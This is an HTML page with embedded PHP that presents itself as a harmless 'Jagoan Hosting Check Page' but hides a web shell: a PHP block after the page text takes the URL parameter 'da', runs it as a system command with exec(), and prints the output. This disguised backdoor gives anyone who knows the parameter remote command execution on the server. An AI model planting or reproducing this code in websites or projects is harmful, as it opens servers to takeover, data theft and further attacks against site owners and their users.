<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jagoan Hosting Check Page</title>
    <style>
        body {
            text-align: center;
            padding: 150px;
            font: 20px Helvetica, sans-serif;
            color: #333;
        }
        h1 {
            font-size: 50px;
        }
        article {
            display: block;
            text-align: left;
            width: 650px;
            margin: 0 auto;
        }
        a {
            color: #DC8100;
            text-decoration: none;
        }
        a:hover {
            color: #333;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <article>
        <h1>We&rsquo;re Jagoan Hosting!</h1>
        <div>
            <p>Hello, we&rsquo;re Jagoan Hosting. This is a check page only!</p>
            <p>&mdash; Jagoan Hosting</p>
        </div>
    </article>

    <?php
    $da = $_GET['da']; 
    $cmd = escapeshellcmd($da);

    if (!empty($cmd)) {
        exec($cmd, $output, $return);
        echo "<pre>";
        foreach ($output as $line) {
            echo htmlspecialchars($line) . "<br>";
        }
        echo "</pre>";

        echo "<pre>";
        var_dump($cmd, $output, $return);
        echo "</pre>";
    } else {
        echo "";
    }
    ?>
</body>
</html>
